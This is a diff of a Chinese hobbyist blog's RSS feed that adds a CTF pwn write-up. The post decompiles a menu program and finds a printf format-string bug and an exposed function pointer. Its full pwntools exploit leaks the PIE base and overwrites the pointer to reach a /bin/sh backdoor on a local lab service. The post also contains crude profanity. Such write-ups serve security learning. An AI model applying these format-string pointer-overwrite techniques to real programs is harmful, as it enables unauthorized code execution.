@@ -1,4 +1,188 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>2026第一周wp</title><link>https://dxfaker.top/posts/26moe4/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe4/</guid><description>我好困，好困。。。。。</description><pubDate>Fri, 11 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>2026第一周wp05</title><link>https://dxfaker.top/posts/26moe5/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe5/</guid><description>12号很累</description><pubDate>Sun, 13 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+&lt;p&gt;图为livyxj新神，有了点问题于是12号鸽了，现在是13号1:14，更新完准备睡觉&lt;/p&gt;
+&lt;h1&gt;外卖补贴&lt;/h1&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PIE+NX&lt;/p&gt;
+&lt;p&gt;看看机翻main&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned __int64 number; // rax
+  _QWORD v5[64]; // [rsp+0h] [rbp-210h] BYREF
+  __int64 v6; // [rsp+200h] [rbp-10h] BYREF
+  unsigned __int64 v7; // [rsp+208h] [rbp-8h]
+
+  memset(v5, 0, sizeof(v5));
+  v7 = 0;
+  initialise(&amp;amp;v6, argv);
+  publish_hook = (__int64 (__fastcall *)(_QWORD))homepage_channel;
+  while ( 1 )
+  {
+    show_menu();
+    number = read_number();
+    if ( number == 4 )
+      return 0;
+    if ( number &amp;gt; 4 )
+      goto LABEL_17;
+    switch ( number )
+    {
+      case 3uLL:
+        publish_hook(&quot;The discount line has been pushed to the homepage.&quot;);// 折扣线已推送到主页。
+        break;
+      case 1uLL:
+        printf(&quot;How long is this campaign line? &quot;);// 这条竞选路线有多长？
+        v7 = read_number();
+        if ( v7 &amp;amp;&amp;amp; v7 &amp;lt;= 0x1FF )
+        {
+          printf(&quot;Drop your campaign line here: &quot;);// 在这里放下你的竞选口号：
+          read_exact(0, v5, v7);
+          *((_BYTE *)v5 + v7) = 0;
+          puts(&quot;Nice. Let us see how many people search for it.&quot;);// 不错。让我们看看有多少人在搜索它。
+        }
+        else
+        {
+          puts(&quot;That campaign line will not fit on the board.&quot;);// 那条竞选路线不适合董事会。
+        }
+        break;
+      case 2uLL:
+        if ( v7 )
+          preview_slogan(v5);
+        else
+          puts(&quot;No campaign line has been submitted.&quot;);// 尚未提交任何活动线。
+        break;
+      default:
+LABEL_17:
+        puts(&quot;The marketing dashboard ignores that request.&quot;);// 营销仪表板忽略该请求。
+        break;
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看看菜单&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int show_menu()
+{
+  puts(&quot;another ad job?&quot;);
+  puts(&quot;1. press 1 to submit your slogan&quot;);
+  puts(&quot;2. press 2 to preview&quot;);
+  puts(&quot;3. press 3 to pin it on the homepage&quot;);
+  puts(&quot;4. done? clock out&quot;);
+  return printf(off_20A0);
+}                                               // int show_menu（）{puts（“另一个广告作业？”）；puts（”1。按1提交你的口号）；把（“2。按2预览“）；按3。按3将其固定在主页上”）。完成？时钟输出”）；返回printf（off_20A0）；}
+                                                // 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到输入&amp;gt;=4都会被踹&lt;/p&gt;
+&lt;p&gt;选3操作&lt;/p&gt;
+&lt;p&gt;选1先是输入长度，然后输入内容&lt;/p&gt;
+&lt;p&gt;选2:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall preview_slogan(const char *a1)
+{
+  printf(&quot;preview: &quot;);
+  printf(a1);
+  return putchar(10);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;操作空间这不就来了吗兄弟&lt;/p&gt;
+&lt;p&gt;然后就是找后门环节&lt;/p&gt;
+&lt;p&gt;shift+F12唤出strings&lt;/p&gt;
+&lt;p&gt;找到bin,按X查看调用(这个我他妈好像已经讲了很多遍了)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int director_channel()
+{
+  char *argv[4]; // [rsp+10h] [rbp-20h] BYREF
+
+  argv[0] = &quot;/bin/sh&quot;;
+  argv[1] = &quot;-p&quot;;
+  argv[2] = 0;
+  chdir(&quot;/&quot;);
+  alarm(0xFu);
+  return execve(&quot;/bin/sh&quot;, argv, 0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ok&lt;/p&gt;
+&lt;p&gt;现在归纳思路&lt;/p&gt;
+&lt;p&gt;可操作点在于&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; printf(a1);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;喜欢不限制，喜欢直接打印&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://dxfaker.top/posts/printf/&quot;&gt;printf的小巧思 - dxfaker&apos;s blog&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;还有v5的栈溢出&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; v7 &amp;amp;&amp;amp; v7 &amp;lt;= 0x1FF
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对输入长度的值的限制&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;read_exact(0, v5, v7);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对v5的读入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; _QWORD v5[64]; // [rsp+0h] [rbp-210h] BYREF
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;v5是长度是0x210&lt;/p&gt;
+&lt;p&gt;下面注意我说的话:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;负数在检查上界的时候是没问题的，他就是会小于正常正数，但是调用的时候他会变成0xFFFFFFFFFFFFFFFF&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;现在我们缺的是什么&lt;/p&gt;
+&lt;p&gt;真实地址(%p)&lt;/p&gt;
+&lt;p&gt;可执行跳转到后门操作的地方&lt;/p&gt;
+&lt;p&gt;那怎么跳转进入后门呢&lt;/p&gt;
+&lt;p&gt;操作三&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;publish_hook(&quot;The discount line has been pushed to the homepage.&quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;且&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; publish_hook = (__int64 (__fastcall *)(_QWORD))homepage_channel;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;又因为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall homepage_channel(const char *a1)
+{
+  return puts(a1);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;你他妈是个指针啊&lt;/p&gt;
+&lt;p&gt;那我可以找个栈溢出给你覆盖了，哦原来有了，那我什么都不缺了&lt;/p&gt;
+&lt;p&gt;总结exp思路&lt;/p&gt;
+&lt;p&gt;第一轮泄露地址，第二轮栈溢出输入写入+触发拿到后门&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+
+context.log_level = &apos;info&apos;
+context.arch = &apos;amd64&apos;
+
+p = remote(&quot;127.0.0.1&quot;, 61073)
+# p = process(&apos;./full-reduction&apos;)
+def menu(n):                          
+    p.recvuntil(b&apos;&amp;gt; &apos;)
+    p.sendline(str(n).encode())
+
+def submit(data):                    
+    menu(1)
+    p.recvuntil(b&apos;How long is this campaign line? &apos;)
+    p.sendline(str(len(data)).encode())
+    p.recvuntil(b&apos;Drop your campaign line here: &apos;)
+    p.send(data)
+
+submit(b&apos;%9$p.&apos;)
+menu(2)
+p.recvuntil(b&apos;preview: &apos;)
+leak = int(p.recvuntil(b&apos;.&apos;, drop=True), 16)
+pie_base = leak - 0x1670
+
+tgt = pie_base + 0x40b0
+fmt = b&apos;X&apos; * 247
+fmt += b&apos;%42$hhn&apos;
+fmt += b&apos;XX&apos;
+fmt += p64(tgt)
+submit(fmt)
+menu(2)
+
+menu(3)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;%9$p不再赘述&lt;/p&gt;
+&lt;p&gt;怎么算出来是鸡巴的第42位参数覆盖也不说了&lt;/p&gt;
+&lt;p&gt;XX补字节&lt;/p&gt;
+</content:encoded></item><item><title>2026第一周wp</title><link>https://dxfaker.top/posts/26moe4/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe4/</guid><description>我好困，好困。。。。。</description><pubDate>Fri, 11 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
 &lt;p&gt;等一下就要回家了，所以今天大概率就更一篇吧，还有这个食蜂好好看&lt;/p&gt;
 &lt;h1&gt;兰斯先生的秘密&lt;/h1&gt;
 &lt;pre&gt;&lt;code&gt;RELRO:      Full RELRO
